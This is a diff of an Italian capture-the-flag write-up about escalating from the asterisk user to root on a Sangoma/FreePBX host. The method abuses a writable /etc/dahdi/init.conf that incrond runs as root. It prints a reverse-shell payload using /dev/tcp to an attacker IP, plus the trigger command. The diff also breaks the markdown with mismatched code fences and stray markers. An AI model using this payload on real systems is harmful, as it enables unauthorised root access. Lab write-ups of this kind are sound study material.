@@ -71,7 +71,7 @@ Una volta ottenuta la prima sessione (Foothold) come utente a basso privilegio `
 
 Il sistema operativo bersaglio è stato identificato come **Sangoma Linux 7 (Core)**, una distribuzione a 64-bit basata sull'architettura di RHEL/CentOS 7, specifica per infrastrutture VoIP FreePBX.
 
-```bash
+```js
 asterisk@connected ~]\$ uname -a
 Linux connected 5.4.239-1.el7.elrepo.x86_64 #1 SMP Thu Mar 30 10:40:27 EDT 2023 x86_64 x86_64 x86_64 GNU/Linux
 
@@ -85,14 +85,16 @@ ID_LIKE="centos rhel fedora"
 È stata eseguita una scansione automatizzata alla ricerca di binari con il bit SUID impostato (`-perm -4000`), i quali vengono eseguiti nativamente con i privilegi del proprietario del file (`root`).
 
 ```bash
+
 asterisk@connected ~]\$ find / -perm -4000 -ls 2>/dev/null
+
 ```
 
-Tra i risultati standard del sistema, sono stati isolati due binari insoliti e altamente critici configurati con il bit SUID:
+#### Tra i risultati standard del sistema, sono stati isolati due binari insoliti e altamente critici configurati con il bit SUID:
 1. `/usr/bin/at`
 2. `/usr/bin/incrontab`
 
----
+```lua
 
 ## 2. Analisi del Vettore e Flotta di Attacco
 Mentre i vettori classici legati ad `at` e `pkexec` (PwnKit) sono risultati non sfruttabili o patchati a livello di demone in background, l'attenzione si è spostata sull'utility **`incrontab`** e sull'architettura dei servizi del centralino.
@@ -101,17 +103,14 @@ Il demone `incrond` monitora in tempo reale le modifiche ai file basandosi sugli
 
 È stato verificato che l'utente `asterisk` possiede i diritti di **scrittura diretta** sul file di configurazione globale dei driver:
 
-```bash
 asterisk@connected ~]\$ ls -l /etc/dahdi/init.conf
 -rw-r--r--. 1 asterisk asterisk 827 Sep 12 16:47 /etc/dahdi/init.conf
 ```
 
----
-
 ## 3. Sfruttamento (Exploitation)
 
 ### Passo 1: Iniezione del Payload
-Poiché il file `/etc/dahdi/init.conf` viene interpretato ed eseguito come script Bash dal demone `incron` (con privilegi di `root`), è stato inserito un payload per forzare il server a inviare una reverse shell interattiva verso la macchina dell'attaccante.
+- [x] Poiché il file `/etc/dahdi/init.conf` viene interpretato ed eseguito come script Bash dal demone `incron` (con privilegi di `root`), è stato inserito un payload per forzare il server a inviare una reverse shell interattiva verso la macchina dell'attaccante.
 
 ```bash
 echo "bash -c 'exec bash -i &>/dev/tcp/10.10.17.105/5555 <&1'" >> /etc/dahdi/init.conf
@@ -140,8 +139,6 @@ Per costringere il demone SUID a ricaricare le configurazioni ed eseguire il fil
 echo "1" > /var/spool/asterisk/sysadmin/dahdi_restart
 ```
 
----
-
 ## 4. Post-Sfruttamento (Ottenimento della Root)
 Immediatamente dopo l'attivazione del trigger, il demone `incrond` ha eseguito le istruzioni presenti in `/etc/dahdi/init.conf`. 
 
@@ -155,4 +152,4 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-La flag finale è stata recuperata all'interno della directory `/root/root.txt`.
+- [x] La flag finale è stata recuperata all'interno della directory `/root/root.txt`.
